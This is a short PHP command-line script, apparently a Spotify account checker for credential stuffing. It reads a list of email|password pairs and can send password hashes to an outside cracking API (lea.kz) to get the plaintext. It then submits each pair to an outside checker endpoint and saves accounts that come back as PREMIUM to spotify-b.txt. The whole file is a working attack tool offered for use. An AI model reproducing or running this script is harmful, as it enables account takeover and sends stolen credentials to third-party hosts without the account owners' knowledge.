<?php
error_reporting(0);
function in_string($s,$as) {
	$s=strtoupper($s);
	if(!is_array($as)) $as=array($as);
	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
	return false;
}
if(empty($argv[1])) exit("List empass mana?");
$file = file_get_contents($argv[1]);
$data = explode("\n",$file);
for($a=0;$a<count($data);$a++){
        $data1 = explode("|",$data[$a]);
        $email = $data1[0];
        $pass = $data1[1];
	if($argv[2]=="--md5"){
		$get = @file_get_contents("https://lea.kz/api/hash/$pass");
		$json = json_decode($get,true);
		$pass = $json['password'];
	}
	$cek = @file_get_contents("https://www.ezcom-proaudio.my/sass/conn.php?email=$email&pass=$pass");
	if (strpos($cek,"PREMIUM")) {
                if(!in_array($cek,explode("\n",@file_get_contents("spotify-b.txt")))){
                        $h=fopen("spotify-b.txt","a");
                        fwrite($h,$cek."\n");
                        fclose($h);
                }
		$cek = "\033[32m".$cek. "\033[0m";
        }else{
		$cek = "\033[31m".$cek. "\033[0m";
	}
        print("[$a/".count($data)."] ".$cek."\n");
}
